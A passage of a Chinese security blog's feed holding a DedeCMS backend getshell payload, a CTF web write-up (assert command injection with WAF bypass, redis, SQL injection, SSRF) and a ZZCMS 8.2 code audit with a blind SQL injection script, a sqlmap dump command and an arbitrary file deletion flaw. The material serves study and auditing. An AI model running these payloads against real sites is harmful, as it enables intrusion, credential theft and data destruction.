"</span>);</span><br><span class="line">        fwrite($fp,<span class="string">'?'</span>.<span class="string">'&gt;'</span>);</span><br><span class="line">        fclose($fp);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($issign)) WriteEnumsJs($egroup);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'成功更新所有枚举缓存！'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/stepselect_main.php?action=addenum_save&amp;ename=123&amp;issign=1&amp;egroup=;phpinfo();$</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/10/14/KSAUFx.png" alt="image"></p><p>参考文章：<br><a href="https://getpass.cn/" target="_blank" rel="noopener">https://getpass.cn/</a></p><p><a href="https://mochazz.github.io/2018/04/03/dedecms%E6%9C%80%E6%96%B0%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/" target="_blank" rel="noopener">https://mochazz.github.io/2018/04/03/dedecms%E6%9C%80%E6%96%B0%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/</a></p><p><a href="https://xz.aliyun.com/t/2237" target="_blank" rel="noopener">https://xz.aliyun.com/t/2237</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;dedecms后台getshell&quot;&gt;&lt;a href=&quot;#dedecms后台getshell&quot; class=&quot;headerlink&quot; title=&quot;dedecms后台getshell&quot;&gt;&lt;/a&gt;dedecms后台getshell&lt;/h2&gt;&lt;h3 id=&quot;0x01&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CTF夺旗赛</title>
    <link href="http://yoursite.com/2019/10/10/ctf%E5%A4%BA%E6%97%97%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/10/10/ctf%E5%A4%BA%E6%97%97%E8%B5%9B/</id>
    <published>2019-10-10T13:54:25.267Z</published>
    <updated>2019-10-14T10:38:46.405Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF夺旗赛-WEB部分writeup"><a href="#CTF夺旗赛-WEB部分writeup" class="headerlink" title="CTF夺旗赛 WEB部分writeup"></a>CTF夺旗赛 WEB部分writeup</h1><h2 id="将近中秋节，看到i春秋一场比赛，便做了几道web题"><a href="#将近中秋节，看到i春秋一场比赛，便做了几道web题" class="headerlink" title="将近中秋节，看到i春秋一场比赛，便做了几道web题"></a>将近中秋节，看到i春秋一场比赛，便做了几道web题</h2><h2 id="0x01-easyphp-200"><a href="#0x01-easyphp-200" class="headerlink" title="0x01 easyphp 200"></a>0x01 easyphp 200</h2><p><img src="https://s2.ax1x.com/2019/09/12/n08NE6.png" alt="image"><br>首先看到about的信息，可以猜想存在源码泄露</p><p>扫描一下发现index.php.bak，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;waf.php&quot;;</span><br><span class="line">if (isset($_GET[&apos;file&apos;])) &#123;</span><br><span class="line">$file = $_GET[&apos;file&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$file = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$file=str_replace(&quot;./&quot;,&quot;&quot;,$file);</span><br><span class="line">$file=str_replace(&quot;.\\&quot;,&quot;&quot;,$file);</span><br><span class="line">$para = &quot;templates/&quot; . $file . &quot;.php&quot;;</span><br><span class="line">assert(&quot;file_exists(&apos;$para&apos;)&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;My PHP Website&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot; /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;nav class=&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;</span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;navbar-header&quot;&gt;</span><br><span class="line">    &lt;button type=&quot;button&quot; class=&quot;navbar-toggle collapsed&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbar&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;navbar&quot;&gt;</span><br><span class="line">            &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class="line">          &lt;/button&gt;</span><br><span class="line">          &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Project name&lt;/a&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt;</span><br><span class="line">          &lt;ul class=&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">            &lt;li &lt;?php if ($file == &quot;home&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?file=home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li &lt;?php if ($file == &quot;about&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?file=about&quot;&gt;About&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li &lt;?php if ($file == &quot;tips&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?file=tips&quot;&gt;Tips&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li &lt;?php if ($file == &quot;flag&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?file=flag&quot;&gt;Flag&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">          &lt;/ul&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top: 50px&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require_once $para;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=&quot;http://code.jquery.com/jquery-latest.js&quot; /&gt;</span><br><span class="line">&lt;script src=&quot;http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>刚开始看到str_replace，便尝试php伪协议读取，构造php://filter/read=convert.base64-encode/recource=ind./ex,但什么也读不到，其它文件也一样，感觉可能是waf.php针对了php伪协议，便换了思路</p><p>源码中，还有assert(“file_exists(‘$para’)”);，可以想到命令执行<br><img src="https://s2.ax1x.com/2019/09/12/n0N29K.png" alt="image"></p><p>题目中受waf.php的影响，过滤了不少的命令，但可以用./或者.\绕过</p><p>payload: ?file=11’)%20or%20system(‘ca./t%20w./af.php’);%23</p><p><img src="https://s2.ax1x.com/2019/09/12/n0wuUs.png" alt="image"></p><p>/?file=11’)%20or%20system(‘ca./t%20/flag’);%23 得到flag</p><h2 id="0x02-redis-100"><a href="#0x02-redis-100" class="headerlink" title="0x02 redis 100"></a>0x02 redis 100</h2><p>是个redis未授权访问漏洞</p><p><a href="https://www.cnblogs.com/co10rway/p/7995727.html" target="_blank" rel="noopener">https://www.cnblogs.com/co10rway/p/7995727.html</a></p><p><img src="https://s2.ax1x.com/2019/09/12/nBKCGj.png" alt="image"></p><p><img src="https://s2.ax1x.com/2019/09/12/nBKAs0.png" alt="image"></p><h2 id="0x03-SQL-300"><a href="#0x03-SQL-300" class="headerlink" title="0x03 SQL 300"></a>0x03 SQL 300</h2><p><img src="https://s2.ax1x.com/2019/09/12/nBKIO0.png" alt="image"></p><p>可见是个带完整sql语句的回显注入，不过过滤了贼多，是个黑名单检测，经过一番fuzz可知<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格用%09代替</span><br><span class="line">or用 ||代替</span><br><span class="line">单引号用反斜杠\转义</span><br><span class="line">#用%00截断</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/09/12/nDw6ZF.png" alt="image"></p><p>可见要admin登录才行，于是换个思路爆admin的密码，首先报错注入感觉是不行的，因为select被黑名单检测了,本地测试一下:<br><img src="https://s2.ax1x.com/2019/09/13/nsP0uF.png" alt="image"></p><p>思路有了，写个盲注脚本可爆破到admin的密码，登录进去后</p><p><img src="https://s2.ax1x.com/2019/09/13/nsPWjO.png" alt="image"></p><p>经过一番fuzz，发现把sql函数基本上过滤了，命令执行都没回显，感觉是个dnslog注入，但没反应，扫描了一番发现flag.php</p><p><img src="https://s2.ax1x.com/2019/09/13/nsPjKS.png" alt="image"></p><p>感觉仍然没头绪。</p><h2 id="0x04-ssrf-200"><a href="#0x04-ssrf-200" class="headerlink" title="0x04 ssrf 200"></a>0x04 ssrf 200</h2><p><img src="https://s2.ax1x.com/2019/09/13/nra4PA.png" alt="image"></p><p>可以看到请求get参数是url，尝试请求ssrf内网</p><p>payload: ?url=<a href="http://localhost/" target="_blank" rel="noopener">http://localhost/</a></p><p><img src="https://s2.ax1x.com/2019/09/13/nrdczq.png" alt="image"></p><p>然后跟着提示一步一步去读取./git源码<br><img src="https://s2.ax1x.com/2019/09/13/nrqPO0.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CTF夺旗赛-WEB部分writeup&quot;&gt;&lt;a href=&quot;#CTF夺旗赛-WEB部分writeup&quot; class=&quot;headerlink&quot; title=&quot;CTF夺旗赛 WEB部分writeup&quot;&gt;&lt;/a&gt;CTF夺旗赛 WEB部分writeup&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ZZCMS8.2 代码审计</title>
    <link href="http://yoursite.com/2019/10/09/zzcms8.2/"/>
    <id>http://yoursite.com/2019/10/09/zzcms8.2/</id>
    <published>2019-10-09T02:54:27.176Z</published>
    <updated>2019-10-09T02:59:02.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ZZCMS8-2-代码审计"><a href="#ZZCMS8-2-代码审计" class="headerlink" title="ZZCMS8.2 代码审计"></a>ZZCMS8.2 代码审计</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="SQL漏洞"><a href="#SQL漏洞" class="headerlink" title="SQL漏洞"></a>SQL漏洞</h2><h3 id="漏洞发生在-user-del-php-第95行"><a href="#漏洞发生在-user-del-php-第95行" class="headerlink" title="漏洞发生在/user/del.php 第95行"></a>漏洞发生在/user/del.php 第95行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pagename=trim($_POST[<span class="string">"pagename"</span>]);</span><br><span class="line">$tablename=trim($_POST[<span class="string">"tablename"</span>]);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">$sql=<span class="string">"select id,saver from "</span>.$tablename.<span class="string">" where id in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$sql=<span class="string">"select id,saver from "</span>.$tablename.<span class="string">" where id ='$id'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$rs=query($sql);</span><br></pre></td></tr></table></figure><p>可见post传入的tablename没有做严格的过滤，而且拼接在sql语句中，下面用bp抓包测试一下<br><img src="https://s2.ax1x.com/2019/09/19/nqQOo9.png" alt="image"></p><p>因为代码中未有输出位，所以这里用延时盲注    </p><pre><code>![image](https://s2.ax1x.com/2019/09/19/nqrVb9.png)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'</span>  </span><br><span class="line">url = <span class="string">"http://www.wyc.com/user/del.php"</span></span><br><span class="line">user = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line"></span><br><span class="line">startTime = time.time()</span><br><span class="line">str1 = str(ord(payload))</span><br><span class="line">post_data = <span class="string">"id=1&amp;tablename=zzcms_answer where id=0 union select 1,2 and if((ascii(substr(database(),%s,1))=%s),sleep(2),1)#"</span>%(i,str1)</span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line">cookie=&#123;<span class="string">'bdshare_firstime'</span>:<span class="string">'1568780385995'</span>,<span class="string">'PHPSESSID'</span>:<span class="string">'7fih9osc4vupgl87u76unqvsag'</span>,<span class="string">'UserName'</span>:<span class="string">'test'</span>,<span class="string">'PassWord'</span>:<span class="string">'098f6bcd4621d373cade4e832627b4f6'</span>&#125;</span><br><span class="line">response = requests.post(url,timeout=<span class="number">6</span>,data=post_data,headers=headers,cookies=cookie)</span><br><span class="line">subtract = time.time()- startTime</span><br><span class="line"><span class="keyword">if</span> time.time() - startTime &gt;<span class="number">2</span>:</span><br><span class="line">user = user + payload</span><br><span class="line"><span class="keyword">print</span> user</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/20/nX1JFe.png" alt="image"></p><h3 id="漏洞发生在user-logincheck-php第84行"><a href="#漏洞发生在user-logincheck-php第84行" class="headerlink" title="漏洞发生在user/logincheck.php第84行"></a>漏洞发生在user/logincheck.php第84行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$sql=<span class="string">"select * from zzcms_user where username='"</span>.$username.<span class="string">"' and  password='"</span>.$password.<span class="string">"' "</span>;</span><br><span class="line">$rs = query($sql); </span><br><span class="line">$row= num_rows($rs);</span><br><span class="line"><span class="keyword">if</span>(!$row)&#123;</span><br><span class="line">....</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">....</span><br><span class="line">$rs = query($sql); </span><br><span class="line">$row= fetch_array($rs);</span><br><span class="line"><span class="keyword">if</span>(!$row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('用户被锁定！');history.go(-1)&lt;/script&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">query(<span class="string">"delete from zzcms_login_times where ip='$ip'"</span>);<span class="comment">//登录成功后，把登录次数记录删了</span></span><br><span class="line">query(<span class="string">"UPDATE zzcms_user SET showlogintime = lastlogintime WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//更新上次登录时间</span></span><br><span class="line">query(<span class="string">"UPDATE zzcms_user SET showloginip = loginip WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//更新上次登录IP</span></span><br><span class="line">query(<span class="string">"UPDATE zzcms_user SET logins = logins+1 WHERE username='"</span>.$username.<span class="string">"'"</span>);</span><br><span class="line">query(<span class="string">"UPDATE zzcms_user SET loginip = '"</span>.getip().<span class="string">"' WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//更新最后登录IP</span></span><br><span class="line"><span class="keyword">if</span> (strtotime(date(<span class="string">"Y-m-d H:i:s"</span>))-strtotime($row[<span class="string">'lastlogintime'</span>])&gt;<span class="number">86400</span>)&#123;</span><br><span class="line">query(<span class="string">"UPDATE zzcms_user SET totleRMB = totleRMB+"</span>.jf_login.<span class="string">" WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//登录时加积分</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query(<span class="string">"UPDATE zzcms_user SET loginip = '"</span>.getip().<span class="string">"' WHERE username='"</span>.$username.<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure><p>看一下getip的定义:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function getip()&#123; </span><br><span class="line">if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;HTTP_CLIENT_IP&quot;); </span><br><span class="line">else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); </span><br><span class="line">else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;REMOTE_ADDR&quot;); </span><br><span class="line">else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;)) </span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; </span><br><span class="line">else </span><br><span class="line">$ip = &quot;unknown&quot;; </span><br><span class="line">return($ip); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可见对getip没有什么过滤，存在ip注入，这里用sqlmap跑一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r sqlmap\sql.txt --batch -D zzcms -T zzcms_admin -C &apos;admin,pass&apos; --dump</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//sql.txt</span><br><span class="line">POST /user/logincheck.php HTTP/1.1</span><br><span class="line">Host: www.wyc.com</span><br><span class="line">Content-Length: 111</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://www.wyc.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://www.wyc.com/user/login.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7</span><br><span class="line">Cookie: bdshare_firstime=1568780385995; PHPSESSID=7fih9osc4vupgl87u76unqvsag</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 127.0.0.1*</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/22/uSQwLR.png" alt="image"></p><h2 id="任意文件删掉漏洞"><a href="#任意文件删掉漏洞" class="headerlink" title="任意文件删掉漏洞"></a>任意文件删掉漏洞</h2><h3 id="漏洞发生在-user-adv-php第80行"><a href="#漏洞发生在-user-adv-php第80行" class="headerlink" title="漏洞发生在/user/adv.php第80行"></a>漏洞发生在/user/adv.php第80行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"action"</span>]))&#123;</span><br><span class="line">$action=$_REQUEST[<span class="string">"action"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$action=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"adv"</span>]))&#123;</span><br><span class="line">$adv=$_REQUEST[<span class="string">"adv"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$adv=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"advlink"</span>]))&#123;</span><br><span class="line">$advlink=$_REQUEST[<span class="string">"advlink"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$advlink=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"company"</span>]))&#123;</span><br><span class="line">$company=$_REQUEST[<span class="string">"company"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$company=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"img"</span>]))&#123;</span><br><span class="line">$img=$_REQUEST[<span class="string">"img"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$img=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"oldimg"</span>]))&#123;</span><br><span class="line">$oldimg=$_REQUEST[<span class="string">"oldimg"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$oldimg=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($action==<span class="string">"modify"</span>)&#123;</span><br><span class="line">query(<span class="string">"update zzcms_textadv set adv='$adv',company='$company',advlink='$advlink',img='$img',passed=0 where username='"</span>.$_COOKIE[<span class="string">"UserName"</span>].<span class="string">"'"</span>);</span><br><span class="line"><span class="keyword">if</span> ($oldimg&lt;&gt;$img)&#123;</span><br><span class="line">$f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line"><span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">unlink($f);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见$f中的$oldimg变量是可控的，而且没有对此做什么限制，可构造任意删掉文件漏洞</p><p><img src="https://s2.ax1x.com/2019/09/23/uii6TU.png" alt="image"></p><p>同样的漏洞也出现/user/licence_save.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line">if ($_GET[&quot;action&quot;]==&quot;add&quot;)&#123;</span><br><span class="line">query(&quot;Insert into zzcms_licence(title,img,editor,sendtime) values(&apos;$title&apos;,&apos;$img&apos;,&apos;$username&apos;,&apos;&quot;.date(&apos;Y-m-d H:i:s&apos;).&quot;&apos;)&quot;) ; </span><br><span class="line">&#125;elseif ($_GET[&quot;action&quot;]==&quot;modify&quot;)&#123;</span><br><span class="line">$oldimg=trim($_POST[&quot;oldimg&quot;]);</span><br><span class="line">$id=$_POST[&quot;id&quot;];</span><br><span class="line">if ($id==&quot;&quot; || is_numeric($id)==false)&#123;</span><br><span class="line">$FoundErr=1;</span><br><span class="line">$ErrMsg=&quot;&lt;li&gt;&quot;. $f_array[0].&quot;&lt;/li&gt;&quot;;</span><br><span class="line">WriteErrMsg($ErrMsg);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">query(&quot;update zzcms_licence set title=&apos;$title&apos;,img=&apos;$img&apos;,sendtime=&apos;&quot;.date(&apos;Y-m-d H:i:s&apos;).&quot;&apos;,passed=0 where id=&apos;$id&apos;&quot;);</span><br><span class="line">if ($oldimg&lt;&gt;$img 